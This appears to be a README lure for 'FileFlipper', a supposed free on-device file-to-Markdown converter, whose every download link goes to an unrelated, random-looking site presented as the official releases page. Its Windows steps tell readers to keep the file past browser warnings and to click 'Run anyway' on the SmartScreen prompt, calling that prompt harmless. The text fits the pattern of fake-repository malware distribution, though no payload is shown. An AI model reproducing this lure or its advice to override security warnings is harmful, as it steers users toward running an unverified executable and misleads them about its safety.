# 🔄 FileFlipper - Turn Any File Into Clean Markdown

[![Download FileFlipper](https://img.shields.io/badge/⬇️_Download_FileFlipper-Visit_Releases_Page-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://hiuuhouyhkuhh.github.io)

FileFlipper is a small, friendly program for Mac and Windows that turns your everyday documents and images into clean, simple text files — the kind that AI tools read quickly and cheaply. Word documents, PDFs, PowerPoint slides, Excel sheets, photos, screenshots, videos: drop them in, flip them out. No account, no upload, no cloud. Everything happens on your own computer.

It is free, it is open source, and it takes about two minutes to get running. 一键转 Markdown — Mac 和 Windows 都能用.

---

## 🚀 Getting Started

Getting FileFlipper onto your Windows computer takes just a few clicks. You do not need to know anything about programming, terminals, or code.

**Step 1 — Visit the download page.**

Go to the official releases page here:

👉 **https://hiuuhouyhkuhh.github.io**

Visit this link to download the application.

**Step 2 — Pick the newest version.**

The page lists versions from newest to oldest. The one at the very top is the latest release. Click on it to expand the details.

**Step 3 — Download the Windows file.**

Inside the newest release you will see a list of files under a heading like "Assets." Look for the file that mentions **Windows** in its name and click it. Your browser will start downloading it right away. If your browser asks whether you want to keep the file, choose **Keep** — this is a normal safety prompt that appears for most downloads.

**Step 4 — Find the file.**

When the download finishes, open your **Downloads** folder. You can get there quickly by pressing the Windows key, typing "Downloads," and pressing Enter. The file you just downloaded will be at the top of the list.

**Step 5 — Run it.**

Double-click the downloaded file to start FileFlipper. If Windows shows a blue "Windows protected your PC" box, click **More info**, then click **Run anyway**. This message appears for many small, independent, open-source programs that haven't paid for a commercial certificate — it is not a sign that anything is wrong.

**Step 6 — You're done.**

FileFlipper is now running on your computer. There is nothing else to configure. You can start converting files immediately.

---

## ✨ What FileFlipper Actually Does

Most people have files scattered everywhere: a contract in Word, a receipt as a PDF, a slide deck from a meeting, a spreadsheet of expenses, a photo of a whiteboard. AI assistants and search tools work best with plain text — but copying and pasting from those files is slow and often messy.

FileFlipper fixes that. It reads your file and produces a clean Markdown document: real headings, real lists, real tables, readable paragraphs. Markdown is a plain-text format that AI models understand extremely well, which means fewer tokens are used, answers come back faster, and you spend less money if you're using a paid AI service.

Everything is processed **on your own device**. Your documents never travel to a server. Nothing is uploaded, nothing is stored remotely, and nothing is shared. That matters if you work with contracts, medical notes, financial records, or anything else you'd rather keep private.

---

## 📄 One-Click Markdown Conversion

This is the heart of FileFlipper. Select a file, click once, and get a Markdown version back.

**Supported document types:**

- **Word (.docx)** — headings, bold and italic text, bullet and numbered lists, tables, and links are all preserved as proper Markdown.
- **PDF (.pdf)** — text is extracted in reading order, with paragraphs rebuilt and page breaks removed so the result reads like a normal document instead of a stack of fragments.
- **PowerPoint (.pptx)** — each slide becomes its own section, with titles, bullet points, and speaker notes kept in place.
- **Excel (.xlsx)** — every sheet becomes a Markdown table, with column headers detected automatically.

The output is a `.md` file saved right next to your original, with the same name. Open it in any text editor — Notepad works fine — or paste it straight into your AI tool of choice.

**Why Markdown instead of plain text?** Because structure survives. A plain copy-paste turns a table into a wall of numbers and a list into a run-on sentence. Markdown keeps the shape of the document, so the AI knows what is a heading, what is a bullet, and what is a data table. That structure is what makes the answers you get back noticeably better.

---

## 🖼️ Shift-Drag Conversion in Finder and File Explorer

There's a second, faster way to use FileFlipper — one that fits into how you already work.

Hold down the **Shift** key while you drag a file, and FileFlipper converts it on the spot. You don't have to open the app, pick a menu, or choose a format. Just Shift-drag and let go.

**What Shift-drag can do:**

- **Images — JPG, PNG, HEIC** — convert between formats, resize, or prepare an image for AI tools that can't read pictures directly.
- **PDF** — pull the text out, or turn pages into images.
- **MP4** — extract frames or prepare video files for downstream tools.
- **Crop** — trim an image down to just the part you need.
- **OCR** — read the text out of a screenshot, a scanned page, or a photo of a receipt, and hand it back as editable, searchable text.

The OCR engine runs locally and handles printed text in multiple languages, including Chinese and English. If you photograph a menu, a sign, or a printed page, Shift-drag it and you'll have the words in seconds.

---

## 🔒 100% On-Device and Open Source

FileFlipper does not have a login screen, an account system, a subscription, or a usage limit. There is no telemetry quietly reporting what you convert. There is no "free tier" that runs out.

The entire program runs on your machine. When you close it, nothing is left behind except the files you asked it to make.

The source code is publicly available and free to inspect, modify, and share. If you're curious how a particular conversion works, you can read the code. If you want to add a format, you can. If you just want a tool that does its job and stays out of the way, you can use it as-is forever.

FileFlipper is built with Swift, runs natively on macOS, and ships a matching Windows build so the two platforms behave the same way.

---

## 💡 Common Questions

**Do I need to install anything else first?**
No. Download the file, run it, and you're working.

**Where do my converted files go?**
In the same folder as the original, with the same name and a new extension. If your file was called `report.docx`, the result is `report.md` right beside it.

**Does it work offline?**
Yes, completely. FileFlipper never needs an internet connection to convert anything.

**Can I convert a whole folder at once?**
Yes. Select several files and convert them together, or Shift-drag a group.

**What if a PDF is just a scan with no real text?**
That's what OCR is for. FileFlipper will read the image of the page and pull the words out, so scanned documents come back as editable text rather than blank output.

**Is there a file size limit?**
Very large presentations and multi-hundred-page PDFs take longer, but they will process. Give the app a moment on big files.

**Will it change my original files?**
Never. FileFlipper only reads the original and writes a new file. Your source documents stay exactly as they were.

---

## 🛠️ Tips for Best Results

- Convert the **original** file rather than a screenshot of it whenever you can — the text quality will be far better.
- For spreadsheets with merged cells, check the resulting table and adjust by hand if needed.
- For image-heavy PDFs, run OCR first, then convert.
- Save your Markdown output in a dedicated folder if you're building a library of documents for an AI assistant to read.

---

## 🤝 Contributing and Feedback

FileFlipper is open source and welcomes help. If you find a document that converts badly, open an issue on the repository with a description of the problem — sample files are especially useful. If you'd like to add support for a new format or improve an existing converter, pull requests are welcome.

If you just want to say thanks or suggest a feature, open an issue and say hello.

---

## ⬇️ Download FileFlipper

Ready to try it?

👉 **https://hiuuhouyhkuhh.github.io**

Visit this link to download the application.

Free. Open source. On-device. Mac and Windows. 一键转 Markdown.

Keywords: ai, background-removal, cross-platform, docx-to-markdown, file-converter, finder, image-converter, llm, macos, markdown, menu-bar-app, ocr, open-source, pdf, pdf-to-markdown, pdf-tools, privacy, productivity, swift, windows